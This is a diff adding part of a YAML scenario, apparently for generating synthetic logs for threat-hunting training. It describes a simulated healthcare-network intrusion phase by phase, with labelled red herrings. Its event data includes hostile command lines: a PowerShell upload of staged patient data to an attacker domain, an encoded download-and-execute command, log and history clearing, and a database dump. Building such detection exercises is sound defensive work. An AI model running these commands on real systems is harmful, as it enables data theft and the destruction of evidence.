+        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+        orig_bytes: 256
+        resp_bytes: 1024
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+
+  # === Phase 17: Blocked C2 (+6h) ===
+
+  - id: evt-blocked-c2
+    time: "+6h"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "DC-01 malware tries direct beacon — blocked by firewall (servers can't reach arbitrary external ports)"
+    events:
+      - type: beacon
+        dst_ip: "45.33.32.30"
+        dst_port: 443
+        service: ssl
+        action: deny
+        interval: "30m"
+        duration: "6h"
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+        description: "Firewall denies outbound — server_vlan not allowed to external on 443"
+
+  # === Phase 18: DNS Tunneling (+6h) ===
+
+  - id: evt-dns-tunnel
+    time: "+6h"
+    actor: root
+    system: APP-INT-01
+    activity: "Exfiltrate data via DNS tunnel from APP-INT-01"
+    events:
+      - type: dns_tunnel
+        base_domain: "ns1.cdn-health-updates.net"
+        encoding: hex
+        qtype: TXT
+        interval: "2s"
+        duration: "15m"
+        payload_size: 512
+        technique: "T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol"
+
+  # === Phase 19: DGA Activity (+6h15m) ===
+
+  - id: evt-dga-queries
+    time: "+6h15m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "DGA domain generation from compromised web server"
+    events:
+      - type: dga_queries
+        tld: ".net"
+        length_range: [10, 18]
+        interval: "30s"
+        duration: "2h"
+        rcode_distribution:
+          NXDOMAIN: 0.92
+          NOERROR: 0.05
+          SERVFAIL: 0.03
+        answer_ip: "45.33.32.30"
+        technique: "T1568.002 - Dynamic Resolution: Domain Generation Algorithms"
+
+  # === Phase 20: Collection — File server staging (+6h30m) ===
+
+  - id: evt-logon-file-server
+    time: "+6h30m"
+    actor: svc_sqlreader
+    system: FILE-SRV-01
+    activity: "Authenticate to file server with backdoor account"
+    events:
+      - type: logon
+        source_ip: "10.10.1.11"
+        logon_type: 3
+        technique: "T1078.002 - Valid Accounts: Domain Accounts"
+
+  - id: evt-fumble-dir-wrong-path
+    time: "+6h32m"
+    actor: svc_sqlreader
+    system: FILE-SRV-01
+    activity: "Fumble: search wrong path for financial data"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\cmd.exe"
+        command_line: "cmd.exe /c dir /s \\\\FILE-SRV-01\\data\\finance\\*.xlsx"
+        technique: "T1083 - File and Directory Discovery"
+        description: "No files found — wrong share path"
+
+  - id: evt-collect-stage-data
+    time: "+6h35m"
+    actor: svc_sqlreader
+    system: FILE-SRV-01
+    activity: "Stage financial and patient data for exfiltration"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\cmd.exe"
+        command_line: "cmd.exe /c dir /s \\\\FILE-SRV-01\\shared\\patient-records\\*.pdf \\\\FILE-SRV-01\\shared\\finance\\*.xlsx"
+        technique: "T1083 - File and Directory Discovery"
+      - type: process
+        process_name: "C:\\Windows\\System32\\xcopy.exe"
+        command_line: "xcopy \\\\FILE-SRV-01\\shared\\patient-records\\*.pdf C:\\Windows\\Temp\\staging\\ /s /e /y"
+        technique: "T1074.001 - Data Staged: Local Data Staging"
+      - type: process
+        process_name: "C:\\Windows\\System32\\xcopy.exe"
+        command_line: "xcopy \\\\FILE-SRV-01\\shared\\finance\\*.xlsx C:\\Windows\\Temp\\staging\\ /s /e /y"
+        technique: "T1074.001 - Data Staged: Local Data Staging"
+
+  - id: evt-collect-compress
+    time: "+6h45m"
+    actor: svc_sqlreader
+    system: FILE-SRV-01
+    activity: "Compress staged data with PowerShell"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -Command Compress-Archive -Path 'C:\\Windows\\Temp\\staging\\*' -DestinationPath 'C:\\Windows\\Temp\\health-data-export.zip'"
+        technique: "T1560.001 - Archive Collected Data: Archive via Utility"
+
+  # === Phase 21: Exfiltration — HTTPS upload (+7h15m) ===
+
+  - id: evt-exfil-upload
+    time: "+7h15m"
+    actor: svc_sqlreader
+    system: FILE-SRV-01
+    activity: "Upload compressed archive to attacker infrastructure over HTTPS"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -Command Invoke-WebRequest -Uri 'https://cdn-assets-update.com/api/v1/upload' -Method POST -InFile 'C:\\Windows\\Temp\\health-data-export.zip'"
+        technique: "T1041 - Exfiltration Over C2 Channel"
+      - type: connection
+        dst_ip: "45.33.32.30"
+        dst_port: 443
+        service: ssl
+        hostname: "cdn-assets-update.com"
+        orig_bytes: 52428800
+        technique: "T1041 - Exfiltration Over C2 Channel"
+        description: "~50 MB upload to C2 server"
+
+  # === Phase 22: Database Access (+8h) ===
+
+  - id: evt-ssh-to-db
+    time: "+8h"
+    actor: root
+    system: DB-PROD-01
+    activity: "SSH from APP-INT-01 to database server"
+    events:
+      - type: ssh_session
+        source_ip: "10.10.2.20"
+        technique: "T1021.004 - Remote Services: SSH"
+
+  - id: evt-fumble-mysqldump-typo
+    time: "+8h3m"
+    actor: root
+    system: DB-PROD-01
+    activity: "Fumble: attacker typos mysqldump command"
+    events:
+      - type: process
+        process_name: "/usr/bin/bash"
+        command_line: "bash -c 'mysqldumpp -u ehr_app -p patient_records > /tmp/patient_dump.sql'"
+        technique: "T1005 - Data from Local System"
+        description: "Typo — 'mysqldumpp' not found, command fails"
+
+  - id: evt-db-dump
+    time: "+8h4m"
+    actor: root
+    system: DB-PROD-01
+    activity: "Dump patient and insurance tables from MySQL"
+    events:
+      - type: process
+        process_name: "/usr/bin/mysqldump"
+        command_line: "mysqldump -u ehr_app -p patient_records insurance_claims > /tmp/patient_dump.sql"
+        technique: "T1005 - Data from Local System"
+      - type: process
+        process_name: "/usr/bin/gzip"
+        command_line: "gzip /tmp/patient_dump.sql"
+        technique: "T1560 - Archive Collected Data"
+
+  - id: evt-db-scp-back
+    time: "+8h10m"
+    actor: root
+    system: DB-PROD-01
+    activity: "SCP database dump back to APP-INT-01"
+    events:
+      - type: process
+        process_name: "/usr/bin/scp"
+        command_line: "scp /tmp/patient_dump.sql.gz root@10.10.2.20:/tmp/"
+        technique: "T1041 - Exfiltration Over C2 Channel"
+      - type: connection
+        dst_ip: "10.10.2.20"
+        dst_port: 22
+        service: ssh
+        technique: "T1021.004 - Remote Services: SSH"
+
+  # === Phase 23: Defense Evasion (+9h) ===
+
+  - id: evt-clear-bash-history-web
+    time: "+9h"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Clear bash history on WEB-EXT-01"
+    events:
+      - type: process
+        process_name: "/usr/bin/bash"
+        command_line: "bash -c 'history -c && rm -f ~/.bash_history'"
+        technique: "T1070.003 - Indicator Removal: Clear Command History"
+
+  - id: evt-clear-bash-history-app
+    time: "+9h1m"
+    actor: root
+    system: APP-INT-01
+    activity: "Clear bash history on APP-INT-01"
+    events:
+      - type: process
+        process_name: "/usr/bin/bash"
+        command_line: "bash -c 'history -c && rm -f ~/.bash_history'"
+        technique: "T1070.003 - Indicator Removal: Clear Command History"
+
+  - id: evt-encoded-ps-download
+    time: "+9h5m"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "Encoded PowerShell command to download cleanup script"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8ANAA1AC4AMwAzAC4AMwAyAC4AMwAwADoAOAAwADgAMAAvAHUAcABkAGEAdABlAC4AcABzADEAIgApAA=="
+        technique: "T1140 - Deobfuscate/Decode Files or Information"
+
+  - id: evt-clear-security-log
+    time: "+9h10m"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "Clear Windows Security event log on DC-01"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\wevtutil.exe"
+        command_line: "wevtutil cl Security"
+        technique: "T1070.001 - Indicator Removal: Clear Windows Event Logs"
+      - type: log_cleared
+        technique: "T1070.001 - Indicator Removal: Clear Windows Event Logs"
+
+  # === Phase 24: Workstation Lock/Unlock (+9h30m) ===
+
+  - id: evt-workstation-lock
+    time: "+9h30m"
+    actor: sarah.oconnell
+    system: WS-DEV-02
+    activity: "Attacker locks compromised workstation before stepping away"
+    events:
+      - type: workstation_lock
+        technique: "T1078 - Valid Accounts"
+
+  - id: evt-workstation-unlock
+    time: "+9h45m"
+    actor: sarah.oconnell
+    system: WS-DEV-02
+    activity: "Attacker unlocks compromised workstation to resume activity"
+    events:
+      - type: workstation_unlock
+        technique: "T1078 - Valid Accounts"
+
+  # === Phase 25: DNS Queries for attacker infra (+10h) ===
+
+  - id: evt-dns-query-c2
+    time: "+10h"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "DNS query for C2 domain from DC-01"
+    events:
+      - type: dns_query
+        query: "cdn-assets-update.com"
+        qtype: A
+        rcode: NOERROR
+        answer: "45.33.32.30"
+        technique: "T1071.004 - Application Layer Protocol: DNS"
+
+  - id: evt-dns-query-tunnel
+    time: "+10h1m"
+    actor: root
+    system: APP-INT-01
+    activity: "DNS query for tunnel infrastructure domain"
+    events:
+      - type: dns_query
+        query: "ns1.cdn-health-updates.net"
+        qtype: A
+        rcode: NOERROR
+        answer: "89.248.167.42"
+        technique: "T1071.004 - Application Layer Protocol: DNS"
+
+  - id: evt-dns-query-exfil
+    time: "+10h2m"
+    actor: root
+    system: WEB-EXT-01
+    activity: "DNS query for secondary exfil domain"
+    events:
+      - type: dns_query
+        query: "img-hosting-cdn.com"
+        qtype: A
+        rcode: NOERROR
+        answer: "91.219.236.18"
+        technique: "T1071.004 - Application Layer Protocol: DNS"
+
+  # === Phase 26: Ongoing C2 beacons (+10h, +12h) ===
+
+  - id: evt-c2-beacon-web-ongoing
+    time: "+10h"
+    actor: root
+    system: WEB-EXT-01
+    activity: "Periodic C2 beacon from WEB-EXT-01"
+    events:
+      - type: beacon
+        dst_ip: "45.33.32.30"
+        dst_port: 8443
+        service: ssl
+        interval: "15m"
+        duration: "4h"
+        jitter: 0.25
+        orig_bytes: 128
+        resp_bytes: 512
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+
+  - id: evt-c2-beacon-dc-ongoing
+    time: "+12h"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "Late-stage C2 beacon from DC-01"
+    events:
+      - type: beacon
+        dst_ip: "45.33.32.30"
+        dst_port: 443
+        hostname: "cdn-assets-update.com"
+        service: ssl
+        interval: "20m"
+        duration: "1h30m"
+        jitter: 0.3
+        method: GET
+        uri: "/api/v1/status"
+        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+        orig_bytes: 256
+        resp_bytes: 512
+        technique: "T1071.001 - Application Layer Protocol: Web Protocols"
+
+  # === Phase 27: Probing database VLAN blind spot ===
+
+  - id: evt-fumble-probe-db-vlan
+    time: "+8h15m"
+    actor: root
+    system: APP-INT-01
+    activity: "Fumble: attacker probes database_vlan host that has no sensor — only visible on firewall"
+    events:
+      - type: connection
+        dst_ip: "10.10.4.10"
+        dst_port: 3306
+        service: mysql
+        technique: "T1046 - Network Service Scanning"
+        description: "Connection attempt visible only on fw-perimeter — no Zeek sensor on database_vlan"
+
+  # === Phase 28: Account Cleanup (+13h) ===
+
+  - id: evt-delete-backdoor-account
+    time: "+13h"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "Delete backdoor account to cover tracks"
+    events:
+      - type: process
+        process_name: "C:\\Windows\\System32\\net.exe"
+        command_line: "net user svc_sqlreader /delete /domain"
+        technique: "T1070 - Indicator Removal"
+      - type: account_deleted
+        target_username: svc_sqlreader
+        technique: "T1070 - Indicator Removal"
+
+  # === Phase 29: Logoff (+13h30m) ===
+
+  - id: evt-logoff-dc
+    time: "+13h30m"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "Attacker logs off from DC-01"
+    events:
+      - type: logoff
+        technique: "T1078 - Valid Accounts"
+
+  - id: evt-logoff-dev
+    time: "+13h30m"
+    actor: sarah.oconnell
+    system: WS-DEV-02
+    activity: "Attacker logs off from compromised dev workstation"
+    events:
+      - type: logoff
+        technique: "T1078 - Valid Accounts"
+
+  - id: evt-logoff-filesrv
+    time: "+13h31m"
+    actor: svc_sqlreader
+    system: FILE-SRV-01
+    activity: "Backdoor account session cleanup on file server"
+    events:
+      - type: logoff
+        technique: "T1078 - Valid Accounts"
+
+red_herrings:
+  - id: rh-after-hours-maintenance
+    time: "+8h30m"
+    actor: tom.nakamura
+    system: DC-01
+    activity: "After-hours IT maintenance — sysadmin RDP to DC-01 running diagnostic commands"
+    explanation: "Tom Nakamura performs weekly after-hours health checks on the domain controller. He has a calendar recurring event for this and always logs the session with IT ops."
+    events:
+      - type: rdp_session
+        source_ip: "10.10.1.20"
+        technique: "T1021.001 - Remote Services: Remote Desktop Protocol"
+      - type: process
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe Get-EventLog -LogName System -Newest 50"
+      - type: process
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe Test-Connection -ComputerName FILE-SRV-01 -Count 4"
+
+  - id: rh-failed-logon-burst
+    time: "+3h45m"
+    actor: brian.kowalski
+    system: WS-FIN-01
+    activity: "Legitimate user fat-fingers password 4 times before succeeding"
+    explanation: "Brian Kowalski returned from lunch and mistyped his password multiple times. Common occurrence — he submitted a help desk ticket about it two weeks ago."
+    events:
+      - type: failed_logon
+        source_ip: "10.10.1.30"
+        logon_type: 2
+      - type: failed_logon
+        source_ip: "10.10.1.30"
+        logon_type: 2
+      - type: failed_logon
+        source_ip: "10.10.1.30"
+        logon_type: 2
+      - type: failed_logon
+        source_ip: "10.10.1.30"
+        logon_type: 2
+      - type: logon
+        source_ip: "10.10.1.30"
+        logon_type: 2
+
+  - id: rh-large-outbound-transfer
+    time: "+5h45m"
+    actor: marcus.chen
+    system: WS-DEV-01
+    activity: "Large outbound file transfer from developer workstation to cloud storage"
+    explanation: "Marcus Chen syncs his local development repository to the company's Azure DevOps instance every evening. The ~2GB transfer is a full repo mirror including build artifacts."
+    events:
+      - type: connection
+        dst_ip: "23.129.64.50"
+        dst_port: 443
+        service: ssl
+        hostname: "dev.azure.com"
+        orig_bytes: 2147483648
+        technique: "T1567 - Exfiltration Over Web Service"
+
+  - id: rh-svc-backup-unusual-host
+    time: "+7h"
+    actor: svc_backup
+    system: APP-INT-01
+    activity: "Service account authenticating from unusual host — scheduled task migration"
+    explanation: "The svc_backup service account was migrated from LOG-SRV-01 to APP-INT-01 as part of an infrastructure consolidation project. IT ops updated the scheduled task last week."
+    events:
+      - type: logon
+        source_ip: "10.10.2.20"
+        logon_type: 5
+      - type: process
+        process_name: "/usr/bin/rsync"
+        command_line: "rsync -avz /var/backups/ backup-store:/mnt/backups/app-int-01/"
+
+output:
+  logs:
+    - format: windows
+    - format: zeek
+    - format: ecar
+    - format: syslog
+    - format: bash_history
+    - format: snort_alert
+    - format: cisco_asa
+    - format: web_access
+    - format: proxy_access
+  destination: "./output"
+  compression: false
